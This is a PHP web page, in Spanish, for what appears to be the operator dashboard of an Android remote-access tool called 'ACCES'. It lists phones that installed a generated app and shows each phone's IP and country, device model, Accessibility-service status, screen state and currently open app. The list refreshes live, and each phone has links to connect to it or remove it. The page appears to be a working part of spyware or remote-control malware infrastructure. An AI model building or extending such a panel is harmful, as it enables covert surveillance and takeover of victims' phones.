<?php
require 'includes/session_check.php';
require 'includes/backend.php';

$result = backend_request('GET', '/api/hosts', null, $_SESSION['owner_token']);
$hosts = $result['status'] === 200 && is_array($result['body']) ? $result['body'] : [];
$loadError = $result['status'] === 200 ? null : 'No se pudo cargar la lista de hosts.';

// Windows no renderiza los emojis de bandera (muestra "CO"), así que usamos imágenes.
function flag_src($cc) {
    $cc = strtolower(trim((string) $cc));
    return (strlen($cc) === 2) ? "https://flagcdn.com/24x18/$cc.png" : '';
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ver - ACCES</title>
    <link rel="icon" type="image/png" href="img/favicon.png">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="assets/css/style.css?v=<?= @filemtime(__DIR__ . '/assets/css/style.css') ?>">
    <style>
        .hosts-table td, .hosts-table th { vertical-align: middle; }
        .host-flag-img { width: 24px; height: 18px; border-radius: 2px; object-fit: cover; vertical-align: middle; }
        .host-name-input {
            background: rgba(0, 255, 65, 0.05);
            border: 1px solid rgba(0, 255, 65, 0.3);
            border-radius: 4px;
            color: #baffc9;
            font-family: 'Share Tech Mono', monospace;
            padding: 6px 8px;
            min-width: 150px;
        }
        .host-name-edit {
            background: transparent;
            border: none;
            color: #baffc9;
            opacity: 0.5;
            cursor: pointer;
            font-size: 0.95rem;
            margin-left: 6px;
            padding: 2px 4px;
        }
        .host-name-edit:hover { opacity: 1; }
        .badge {
            display: inline-flex;
            align-items: center;
            gap: 7px;
            padding: 4px 12px;
            border-radius: 999px;
            font-size: 0.74rem;
            letter-spacing: 0.4px;
            border: 1px solid transparent;
            white-space: nowrap;
        }
        .badge::before {
            content: "";
            width: 7px;
            height: 7px;
            border-radius: 50%;
            background: currentColor;
            box-shadow: 0 0 8px currentColor;
        }
        .badge--on { color: #00ff66; background: rgba(0, 255, 102, 0.1); border-color: rgba(0, 255, 102, 0.4); }
        .badge--off { color: #ff6b81; background: rgba(255, 45, 85, 0.08); border-color: rgba(255, 45, 85, 0.35); }
        .badge--off::before { box-shadow: none; }
        .screen-ind { font-size: 1.2rem; }
        .screen-ind--on { filter: drop-shadow(0 0 6px rgba(0, 255, 102, 0.5)); }
        .screen-ind--off { filter: grayscale(1) brightness(0.5); }
        .current-app { opacity: 0.85; }
        .cell-app, .cell-model { color: var(--text-dark); font-size: 0.8rem; }
        .cell-appname { font-size: 0.86rem; }
        .btn--disabled { pointer-events: auto; }
        .hosts-table td:last-child .btn { margin-left: 8px; }
    </style>
</head>
<body>
    <?php require 'includes/bg_decor.php'; ?>
    <?php require 'includes/top_menu.php'; ?>
    <div class="page-content">
        <div class="hosts-head">
            <div>
                <h2>Tus hosts</h2>
                <p class="hosts-sub">Dispositivos vinculados a tu cuenta, actualizados en vivo.</p>
            </div>
            <?php if (!$loadError && !empty($hosts)): ?>
                <span class="hosts-count">
                    <span class="hosts-count__dot"></span>
                    <?= count($hosts) ?> <?= count($hosts) === 1 ? 'dispositivo' : 'dispositivos' ?>
                </span>
            <?php endif; ?>
        </div>

        <?php if ($loadError): ?>
            <div class="error-msg"><?= htmlspecialchars($loadError) ?></div>
        <?php elseif (empty($hosts)): ?>
            <div class="hosts-empty">
                <div class="hosts-empty__icon">▦</div>
                <p>Todavía no hay ningún dispositivo conectado. Genera una app desde "Conectar" e instálala; cada teléfono que la abra aparecerá aquí.</p>
                <a href="conectar.php" class="btn">Conectar un dispositivo</a>
            </div>
        <?php else: ?>
            <div class="hosts-panel">
              <div class="hosts-panel__scroll">
                <table class="hosts-table">
                <thead>
                    <tr>
                        <th>País</th>
                        <th>App</th>
                        <th>Cliente</th>
                        <th>Dispositivo</th>
                        <th>Accesibilidad</th>
                        <th>Pantalla</th>
                        <th>App abierta</th>
                        <th></th>
                    </tr>
                </thead>
                <tbody id="hostsBody">
                    <?php foreach ($hosts as $host): ?>
                        <tr data-host-id="<?= htmlspecialchars($host['hostId']) ?>">
                            <td class="cell-flag">
                                <?php $fsrc = flag_src($host['countryCode'] ?? null); ?>
                                <img class="host-flag-img" alt="<?= htmlspecialchars(strtoupper($host['countryCode'] ?? '')) ?>"
                                     title="<?= htmlspecialchars($host['ip'] ?? '') ?>"
                                     src="<?= htmlspecialchars($fsrc) ?>" <?= $fsrc ? '' : 'hidden' ?>>
                            </td>
                            <td class="cell-appname"><?= htmlspecialchars($host['appName'] ?? '') ?></td>
                            <td class="cell-name">
                                <span class="host-name-text"><?= htmlspecialchars($host['friendlyName']) ?></span>
                                <button class="host-name-edit" title="Editar nombre">✎</button>
                            </td>
                            <td class="cell-model current-app"><?= htmlspecialchars($host['deviceModel'] ?: '—') ?></td>
                            <td class="cell-accessibility">
                                <span class="badge <?= $host['accessibilityEnabled'] ? 'badge--on' : 'badge--off' ?>">
                                    <?= $host['accessibilityEnabled'] ? 'Activo' : 'Inactivo' ?>
                                </span>
                            </td>
                            <td class="cell-screen">
                                <span class="screen-ind <?= $host['screenOn'] ? 'screen-ind--on' : 'screen-ind--off' ?>"
                                      title="<?= $host['screenOn'] ? 'Pantalla encendida' : 'Pantalla apagada/bloqueada' ?>">📱</span>
                            </td>
                            <td class="cell-app current-app"><?= $host['screenOn'] ? htmlspecialchars($host['currentApp'] ?: '—') : '----' ?></td>
                            <td>
                                <a href="host.php?host=<?= urlencode($host['hostId']) ?>" class="btn btn--small">Conectar</a>
                                <button class="btn btn--small btn--danger btn-uninstall" data-host-id="<?= htmlspecialchars($host['hostId']) ?>" data-host-name="<?= htmlspecialchars($host['friendlyName']) ?>">Eliminar</button>
                            </td>
                        </tr>
                    <?php endforeach; ?>
                </tbody>
                </table>
              </div>
            </div>
        <?php endif; ?>
    </div>

    <script>
        const BACKEND_BASE_URL = <?= json_encode(BACKEND_BASE_URL) ?>;
        const OWNER_TOKEN = <?= json_encode($_SESSION['owner_token']) ?>;

        function flagSrc(cc) {
            cc = (cc || '').toLowerCase();
            return cc.length === 2 ? `https://flagcdn.com/24x18/${cc}.png` : '';
        }

        // Edición en línea del nombre (clic en el lápiz). Guarda al salir del campo o con Enter,
        // sin botón aparte — no afecta el nombre de la app instalada.
        function editHostName(cell) {
            const row = cell.closest('tr');
            const hostId = row.dataset.hostId;
            const span = cell.querySelector('.host-name-text');
            const editBtn = cell.querySelector('.host-name-edit');
            const original = span.textContent;

            const input = document.createElement('input');
            input.type = 'text';
            input.className = 'host-name-input';
            input.value = original;
            span.hidden = true;
            editBtn.hidden = true;
            cell.appendChild(input);
            input.focus();
            input.select();

            let finished = false;
            async function finish(saveIt) {
                if (finished) return;
                finished = true;
                const name = input.value.trim();
                input.remove();
                span.hidden = false;
                editBtn.hidden = false;
                if (saveIt && name && name !== original) {
                    span.textContent = name;
                    try {
                        await fetch(`${BACKEND_BASE_URL}/api/hosts/${hostId}/rename`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${OWNER_TOKEN}` },
                            body: JSON.stringify({ friendlyName: name }),
                        });
                    } catch {
                        span.textContent = original;
                    }
                }
            }

            input.addEventListener('keydown', (e) => {
                if (e.key === 'Enter') { e.preventDefault(); finish(true); }
                else if (e.key === 'Escape') { finish(false); }
            });
            input.addEventListener('blur', () => finish(true));
        }

        document.querySelectorAll('#hostsBody .host-name-edit').forEach((btn) => {
            btn.addEventListener('click', () => editHostName(btn.closest('.cell-name')));
        });

        // Refresco en vivo de estado (accesibilidad, pantalla, app abierta, país).
        async function refreshHosts() {
            try {
                const res = await fetch(`${BACKEND_BASE_URL}/api/hosts`, {
                    headers: { 'Authorization': `Bearer ${OWNER_TOKEN}` },
                });
                if (!res.ok) return;
                const hosts = await res.json();
                // Un teléfono nuevo abrió la app (o la tabla estaba vacía): se recarga para
                // que aparezca su fila. Solo se recarga si nadie está editando un nombre.
                const known = new Set([...document.querySelectorAll('#hostsBody tr')].map((r) => r.dataset.hostId));
                const hasNew = hosts.some((h) => !known.has(h.hostId));
                if (hasNew && !document.querySelector('.host-name-input')) {
                    location.reload();
                    return;
                }
                hosts.forEach((h) => {
                    const row = document.querySelector(`#hostsBody tr[data-host-id="${h.hostId}"]`);
                    if (!row) return;

                    const flag = row.querySelector('.host-flag-img');
                    if (flag) {
                        const src = flagSrc(h.countryCode);
                        flag.src = src;
                        flag.alt = (h.countryCode || '').toUpperCase();
                        flag.title = h.ip || '';
                        flag.hidden = !src;
                    }

                    const acc = row.querySelector('.cell-accessibility .badge');
                    if (acc) {
                        acc.textContent = h.accessibilityEnabled ? 'Activo' : 'Inactivo';
                        acc.className = 'badge ' + (h.accessibilityEnabled ? 'badge--on' : 'badge--off');
                    }

                    const scr = row.querySelector('.cell-screen .screen-ind');
                    if (scr) {
                        scr.className = 'screen-ind ' + (h.screenOn ? 'screen-ind--on' : 'screen-ind--off');
                        scr.title = h.screenOn ? 'Pantalla encendida' : 'Pantalla apagada/bloqueada';
                    }

                    const app = row.querySelector('.cell-app');
                    if (app) app.textContent = h.screenOn ? (h.currentApp || '—') : '----';
                });
            } catch {
                /* reintenta en el próximo ciclo */
            }
        }

        setInterval(refreshHosts, 4000);

        // Botón eliminar: elimina del portal y del servidor
        document.addEventListener('click', async (e) => {
            if (e.target.classList.contains('btn-uninstall')) {
                const hostId = e.target.dataset.hostId;
                const hostName = e.target.dataset.hostName;
                if (confirm(`¿Eliminar "${hostName}" del servidor? Se quitará esta app y todos sus dispositivos; no volverá a aparecer aunque siga instalada.`)) {
                    try {
                        const res = await fetch(`${BACKEND_BASE_URL}/api/hosts/${hostId}`, {
                            method: 'DELETE',
                            headers: { 'Authorization': `Bearer ${OWNER_TOKEN}` },
                        });
                        if (res.ok) {
                            // Se recarga: borrar el host puede quitar varias filas (varios dispositivos).
                            location.reload();
                        } else {
                            alert('Error al eliminar. Intenta de nuevo.');
                        }
                    } catch (err) {
                        alert('Error de conexión: ' + err.message);
                    }
                }
            }
        });
    </script>
</body>
</html>
